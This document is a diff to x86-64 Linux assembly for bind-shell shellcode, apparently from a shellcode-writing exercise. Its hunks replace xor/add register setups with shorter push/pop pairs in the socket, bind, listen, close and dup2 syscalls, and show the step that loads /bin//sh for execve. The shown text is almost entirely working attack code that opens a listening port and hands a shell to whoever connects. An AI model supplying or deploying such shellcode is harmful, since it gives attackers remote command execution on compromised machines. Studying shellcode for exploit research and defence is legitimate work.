@@ -11,21 +11,26 @@ _start:
         ; SOCK_STREAM = 1
         ; syscall number 41
 
-        xor eax, eax
-        add al, 41
+;	xor eax, eax
+;	add al, 41
+	push byte 41
+	pop rax
 
-        xor edi, edi
-	add di, 2
+       ; xor edi, edi
+;	add di, 2
+	push byte 2
+	pop rdi
 
-        xor esi, esi
-        inc rsi
-
+        ;xor esi, esi
+        ;inc rsi
+	push byte 1
+	pop rsi
+	
         xor edx, edx
         syscall
 
         ; copy socket descriptor to rdi for future use
-        mov rdi, rax
-
+        mov edi, eax
 
         ; server.sin_family = AF_INET
         ; server.sin_port = htons(PORT)
@@ -42,21 +47,30 @@ _start:
 
         ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
         ; syscall number 49
-        xor eax, eax
-      	add al, 49
+        ;xor eax, eax
+      	;add al, 49
+	push byte 49
+	pop rax
+	
 
-        mov rsi, rsp
-        xor edx, edx
-        mov dl, 16
+       mov rsi, rsp
+        ;xor edx, edx
+        ;mov dl, 16
+	push byte 16
+	pop rdx
         syscall
 
 
         ; listen(sock, MAX_CLIENTS)
         ; syscall number 50
-        xor eax, eax
-        add al, 50
-        mov esi, -1
-        add esi, 3
+        ;xor eax, eax
+        ;add al, 50
+	push byte 50
+	pop rax
+        ;mov esi, -1
+        ;add esi, 3
+	push byte 2
+	pop rsi 
         syscall
 
 
@@ -77,28 +91,40 @@ _start:
 
         ; close parent
 
-        xor eax, eax
-        mov al, 3
+;        xor eax, eax
+ ;       mov al, 3
+	push byte 3
+	pop rax
         syscall
         ; duplicate sockets
 
         ; dup2 (new, old)
         mov rdi, r9
-        xor eax, eax
-        mov al, 33
+ ;       xor eax, eax
+;        mov al, 33
+	push byte 33
+	pop rax
         xor esi, esi
         syscall
 
-        xor eax, eax
-        add al, 33
-        xor esi, esi
-	add esi, 1
+       ;xor eax, eax
+       ; add al, 33
+	push byte 33
+	pop rax
+        ;xor esi, esi
+	;add esi, 1
+	push byte 1
+	pop rsi
         syscall
 
-        xor eax, eax
-        add al, 33
-        mov rsi, -1
-        add esi, 3
+       ; xor eax, eax
+       ; add al, 33
+	push byte 33
+	pop rax
+        ;mov rsi, -1
+        ;add esi, 3
+	push byte 2
+	pop rsi
         syscall
 
 
@@ -115,7 +141,6 @@ _start:
         push rbx
 
         ; store /bin//sh address in RDI
-
         mov rdi, rsp
 
         ; Second NULL push
